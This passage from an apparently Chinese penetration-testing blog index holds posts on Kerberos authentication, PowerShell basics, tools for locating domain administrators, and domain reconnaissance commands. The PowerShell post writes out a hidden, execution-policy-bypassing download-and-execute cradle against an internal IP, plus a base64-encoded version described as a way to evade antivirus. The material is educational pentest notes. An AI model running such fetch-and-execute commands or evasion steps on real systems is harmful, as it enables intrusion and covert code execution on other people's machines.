Center，中文名叫做密钥分发中心。KDC中包含一个叫做TGS（票据授予中心）的组件，我们便可以理解为他就是一个发放身份认证票据的服务中心，在KDC认证了（其实是KDC中的AS认证的）客户端的身份后，他会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个kerberos通信过程都采用对称加密的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。</p><p><strong>所以整个kerberos认证流程可以简化描述如下：</strong><br>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p><ol><li>客户端向KDC请求获取想要访问的目标服务的服务授予票据（ST）；</li><li>客户端拿着从KDC获取的服务授予票据（ST）访问相应的网络服务；</li></ol><p>简化认证流程图：</p><img src="/2022/10/19/kerberos/image-20221019173439551.png" alt="image-20221019173439551" style="zoom:50%;"><h3 id="Kerberos认证流程">Kerberos认证流程</h3><p>上面说到了简化版的Kerberos认证流程，基本上分为两步。第一步，客户端向KDC请求获得他想要访问的服务的服务授予票据（可以想象成去动物园，想去买一张能够进入动物园的门票）。第二步，拿着这张服务授予票据（Ticket）去访问服务端的服务。<br>大致的过程确实可以看作这两步，但其中还存在一些问题：<br><strong>问题1. KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</strong><br><strong>问题2. 服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？</strong><br>这就需要开始细节的描述一下整个Kerberos认证的过程了~<br>上面提到整个流程可以简化为两大步，但其实在第一步中共做了两件事，这两件事解决了上述问题中的问题1；然后第二步解决了问题2，最终结束认证过程建立通信。<strong>所以整个Kerberos认证流程可以细化为三个阶段也可以</strong><br><strong>理解为三次通信</strong>!接下来从三个阶段三次通信的角度细说认证过程。</p><p>在具体描述整个认证流程之前，我们需要知道几个Kerberos认证的前提条件：</p><ol><li>kerberos协议他是一个“限权”的认证协议，kerberos中会自带一个数据库，这个数据库会由创建kerberos的运维人员提前在库中添加好整个系统中拥有使用kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的。（拿上面的例子来说就是上帝先让C在AB相识之前同时认识A和B，以便后面帮助AB互相认证）</li><li>所有使用kerberos协议的用户和网络服务，在他们添加进kerberos系统中时，都会根据自己当前的密码（用户密码，人为对网络服务随机生成的密码）生成一把密钥存储在kerberos数据库中，且kerberos数据库也会同时保存用户的基本信息（例如用户名，用户IP地址等）和网络服务的基本信息（IP，Server Name）</li><li>kerberos中存在的三个角色，只要是发生了两两之间的通信，那么都需要先进行身份的认证</li></ol><h3 id="第一次通信">第一次通信</h3><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以<strong>第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端</strong>，过程如下：</p><img src="/2022/10/19/kerberos/image-20221019173804654.png" alt="image-20221019173804654" style="zoom:50%;"><p><strong>①</strong> 客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；<br><strong>②</strong> KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；<br><strong>③</strong> 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</p><ul><li>第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端<br>即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</li><li>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。</li></ul><p>至此，第一次通信完成。</p><h3 id="第二次通信">第二次通信</h3><p>此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，<br>其次<strong>请求的主要目的是为了获取能够访问目标网络服务的服务授予票据Ticket</strong>（进入动物园需要的门票）。 在第二次通信请求中，客户端将携带三部分内容交给KDc中的TGS，第二次通信过程具体如下所述：</p><img src="/2022/10/19/kerberos/image-20221019174234481.png" alt="image-20221019174234481" style="zoom:50%;"><p>客户端行为：<br><strong>①</strong> 客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；<br><strong>②</strong> 客户端将自己想要访问的Server服务以明文的方式发送给KDC；<br><strong>③</strong> 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；<br>TGS行为：<br><strong>①</strong> 此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。<br><strong>②</strong> TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。<br><strong>③</strong> 如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。<br><strong>④</strong> 此时KDC将返回响应给客户端，响应内容包括：</p><ul><li>第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。</li><li>第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</li></ul><p>至此，第二次通信完成。</p><h3 id="第三次通信">第三次通信</h3><p>此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</p><img src="/2022/10/19/kerberos/image-20221019174800527.png" alt="image-20221019174800527" style="zoom:50%;"><p>客户端：<br><strong>①</strong> 客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。<br>服务端：<br><strong>①</strong> 服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</p><p>至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。</p><h3 id="总结">总结</h3><p>整个kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即他们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。<br>这为整个kerberos认证过程保证了较高的安全性。以下补充两个kerberos认证的整体流图，一个是kerberos认证的时序图，一个是kerberos认证的示意图，望能加深kerberos认证印象~~<br>示意图：</p><img src="/2022/10/19/kerberos/image-20221019175139789.png" alt="image-20221019175139789" style="zoom:50%;"><p>时序图：</p><img src="/2022/10/19/kerberos/image-20221019175201693.png" alt="image-20221019175201693" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell</title>
      <link href="/2022/10/15/Powershell/"/>
      <url>/2022/10/15/Powershell/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍">介绍</h3><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><img src="/2022/10/15/Powershell/image-20221013165216253.png" alt="image-20221013165216253" style="zoom:50%;"><img src="/2022/10/15/Powershell/image-20221013165318603.png" alt="image-20221013165318603" style="zoom:50%;"><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0     windows server 2008</p><p>2.0     windows server 2008 r2、windows 7</p><p>3.0     windows server 2012、windows 8</p><p>4.0     windows server 2012 r2、windows 8.1</p><p>5.0     windows 10</p><p>5.1     windows server 2016</p><h3 id="基本介绍">基本介绍</h3><ul><li>ps1文件</li></ul><p>​ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><ul><li><p>执行策略</p><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><img src="/2022/10/15/Powershell/image-20221013165958649.png" alt="image-20221013165958649" style="zoom:50%;"><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。</p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><img src="/2022/10/15/Powershell/image-20221013170431690.png" alt="image-20221013170431690" style="zoom:50%;"></li><li><p>运行脚本</p><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行</p></li><li><p>管道</p></li></ul><p>​PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>​例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><img src="/2022/10/15/Powershell/image-20221013171111464.png" alt="image-20221013171111464" style="zoom:50%;"><h3 id="一些命令">一些命令</h3><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><ul><li><p>文件操作类命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建目录test：New-Item test -ItemType directory</span><br><span class="line">删除目录test：Remove-Item test</span><br><span class="line">新建文件test.txt：New-Item test.txt -ItemType file</span><br><span class="line">新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件test.txt：Remove-Item test.txt</span><br><span class="line">查看文件test.txt内容：Get-Content  test.txt</span><br><span class="line">设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件test.txt内容：Clear-Content test.txt</span><br></pre></td></tr></table></figure></li><li><p>绕过本地权限并执行</p><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><img src="/2022/10/15/Powershell/image-20221013172448111.png" alt="image-20221013172448111" style="zoom:50%;"></li></ul><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><img src="/2022/10/15/Powershell/image-20221013173324661.png" alt="image-20221013173324661" style="zoom:50%;"><ul><li><p>绕过本地权限并隐藏执行</p><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>或者简写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用base64对命令进行编码</p><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">工具下载地址</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat tmp.txt</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;python ps_encoder.py -s tmp.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 –Enc 指定 Base64 编码内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定位域管理员的6种方式</title>
      <link href="/2022/10/14/Locate_domain_administrators/"/>
      <url>/2022/10/14/Locate_domain_administrators/</url>
      
        <content type="html"><![CDATA[<h3 id="psloggedon">psloggedon</h3><p><strong>1、介绍</strong></p><p>使用条件：PSLoggedOn需要启动Remote Registry Service</p><p>在 Windows 上使用 net session 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户，这是一种存在的局限性。</p><p>PsLoggedOn对本地登录用户的定义是将其配置文件加载到注册表中，因此PsLoggedOn通过扫描 HKEY_USERS 键下的键来确定谁登录。对于名称为用户 SID（安全标识符）的每个密钥， PsLoggedOn 会查找相应的用户名并显示它。为了确定谁通过资源共享登录到计算机， PsLoggedOn使用NetSessionEnum API。请注意，PsLoggedOn将显示您已通过资源共享登录到您查询的远程计算机，因为PsLoggedOn需要登录才能访问远程系统的注册表。</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016184312770.png" alt="image-20221016184312770" style="zoom:50%;"><p><strong>2、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon 下载地址</a></strong></p><p><strong>3、使用用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername|username]</span><br><span class="line"></span><br><span class="line">-                                显示支持的选项和用于输出值的单位。</span><br><span class="line">-l                            仅显示本地登录，不显示本地和网络资源登录。</span><br><span class="line">-x                            不显示登录时间。</span><br><span class="line">\\computername    指定要列出登录信息的计算机的名称。</span><br><span class="line">Username                指定用户名，在网络中搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure><p>-l        仅显示本地登录，不显示本地和网络资源登录。</p><img src="/2022/10/14/Locate_domain_administrators/1665306871466-e4c4e8b1-10f7-4c8c-840b-3997588f2118.png" alt="image-20221013142018112" style="zoom:50%;"><p>\\computername   指定要列出登录信息的计算机的名称，查看谁登陆过这台机器</p><img src="/2022/10/14/Locate_domain_administrators/1665307541478-9cba8196-82f6-4442-b587-a14b9f6a8a9b.png" alt="image-20221013142018112" style="zoom:50%;"><img src="/2022/10/14/Locate_domain_administrators/1665307570106-ab4de206-fe45-4414-acd8-a067605973e0.png" alt="image-20221013142018112" style="zoom:50%;"><p>Username                指定用户名，在网络中搜索该用户登录的计算机。</p><blockquote><p>踩坑：计算机得启用网络发现，并且，默认在域内搜索，不需要指定域，直接输入域用户名称即可。</p></blockquote><img src="/2022/10/14/Locate_domain_administrators/1665309006991-3fd5f405-5266-42b7-9762-ed6982eee095.png" alt="image.png" style="zoom:50%;"><h3 id="PVEFindADUser">PVEFindADUser</h3><p><strong>1、介绍</strong></p><p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。<strong><a href="http://xn--h6qa856gr9i7gt25f29hpp0avncmwhjva898axqx.NET">运行该工具的计算机需要具有.NET</a> Framework 2.0，并且需要具有管理员权限。</strong></p><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser 下载地址</a></p><p><strong>2、用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-h                    显示帮助信息</span><br><span class="line">-u                    检测程序是否有新版本</span><br><span class="line">-current [&quot;username&quot;] -current参数显示域内所有PC上当前登录的用户。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC</span><br><span class="line">-noping               阻止尝试枚举用户登录名之前对目标计算机执行ping命令</span><br><span class="line">-target               此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</span><br></pre></td></tr></table></figure><p>获取域内所有目标计算机上当前登录的所有用户<br>pveFindADUser.exe -current</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016192522075.png" alt="image-20221016192522075" style="zoom:50%;"><p>指定了用户名(DOMAIN\Username)，则显示该用户登录的计算机<br>pveFindADUser.exe -current “FZM\Lisi”</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016193157427.png" alt="image-20221016193157427" style="zoom:50%;"><h3 id="netview">netview</h3><p><strong>1.介绍</strong></p><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p><a href="https://github.com/mubix/netview">Netview 下载地址</a></p><p><strong>2、用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h               显示帮助信息</span><br><span class="line">-f filename.txt  指定要提取主机列表的文件</span><br><span class="line">-e filename.txt  指定要排除的主机名的文件</span><br><span class="line">-o filename.txt  将所有输出重定向到指定的文件</span><br><span class="line">-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</span><br><span class="line">-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">-c               对已找到的共享目录/文件的访问权限进行检查</span><br><span class="line">-i interval      枚举主机之间等待的秒数</span><br><span class="line">-j jitter        应用于间隔的抖动百分比（0.0-1.0）</span><br></pre></td></tr></table></figure><p>-d      列出域内主机的NetSessionEnum，NetShareEnum，NetWkstaUserEnum</p><img src="/2022/10/14/Locate_domain_administrators/image-20221013142018112.png" alt="image-20221013142018112" style="zoom:50%;"><h3 id="NSE-脚本">NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-domains.nse">smb-enum-domains.nse</a>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-users.nse">smb-enum-users.nse</a>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-shares.nse">smb-enum-shares.nse</a>:遍历远程主机的共享目录</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-processes.nse">smb-enum-processes.nse</a>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-sessions.nse">smb-enum-sessions.nse</a>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-os-discovery.nse">smb-os-discovery.nse</a>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016195135590.png" alt="image-20221016195135590" style="zoom:50%;"><img src="/2022/10/14/Locate_domain_administrators/image-20221016195252632.png" alt="image-20221016195252632" style="zoom:50%;"><h3 id="PowerView-脚本">PowerView 脚本</h3><p>1、介绍</p><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code>$Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code>Import-Module PowerView</code>即可导入PowerView，使用<code>Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView 脚本下载地址</a></p><p>2、使用</p><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><img src="/2022/10/14/Locate_domain_administrators/image-20221016204101110.png" alt="image-20221016204101110" style="zoom:80%;"><p>PowerView 中的其他信息收集模块：</p><ul><li><p>Get-NetDomain:获取当前用户所在域名称</p></li><li><p>Get-NetUser：</p><p>获取所有用户的详细信息</p></li><li><p>Get-NetDomainController：</p><p>获取所有域控制器的信息</p></li><li><p>Get-NetComputer：</p><p>获取域内所有机器的详细信息</p></li><li><p>Get-NetOU：</p><p>获取域中的OU信息</p></li><li><p>Get-NetGroup：</p><p>获取所有域内组和组成员信息</p></li><li><p>Get-NetFileServer：</p><p>根据SPN获取当前域使用的文件服务器信息</p></li><li><p>Get-NetShare：</p><p>获取当前域内所有的网络共享信息</p></li><li><p>Get-NetSession：</p><p>获取指定服务器的会话</p></li><li><p>Get-NetRDPSession：</p><p>获取指定服务器的远程连接</p></li><li><p>Get-NetProcess：</p><p>获取远程主机的进程</p></li><li><p>Get-UserEvent：</p><p>获取指定用户的日志</p></li><li><p>Get-ADObject：</p><p>获取活动目录的对象</p></li><li><p>Get-NetGPO：</p><p>获取域内所有组的策略对象</p></li><li><p>Get-DomainPolicy：</p><p>获取域默认策略或域控制器策略</p></li><li><p>Invoke-UserHunter：</p><p>获取域用户登陆的计算机信息及该用户是否有本地管理员权限</p></li><li><p>Invoke-ProcessHunter：</p><p>通过查询域内所有的机器进程找到特定用户</p></li><li><p>Invoke-UserEventHunter：</p><p>根据用户日志查询某域用户登陆过哪些域机器</p></li></ul><p><img src="/2022/10/14/Locate_domain_administrators/image-20221016204536485.png" alt="image-20221016204536485"></p><h3 id="Empire">Empire</h3><p>不常用，暂时不看，留着坑位</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内信息收集</title>
      <link href="/2022/10/13/Intra-domain_information_collection/"/>
      <url>/2022/10/13/Intra-domain_information_collection/</url>
      
        <content type="html"><![CDATA[<h3 id="判断是否存在域">判断是否存在域</h3><ul><li>ifconfig</li></ul><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103430393.png" alt="image-20221013103430393"><br>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP<br><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103501517.png" alt="image-20221013103501517"></p><ul><li>系统详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303896642-04459935-5a9e-4d75-89e6-3438668c5f68.png" alt="image.png"></p><ul><li>当前登录域与域用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img 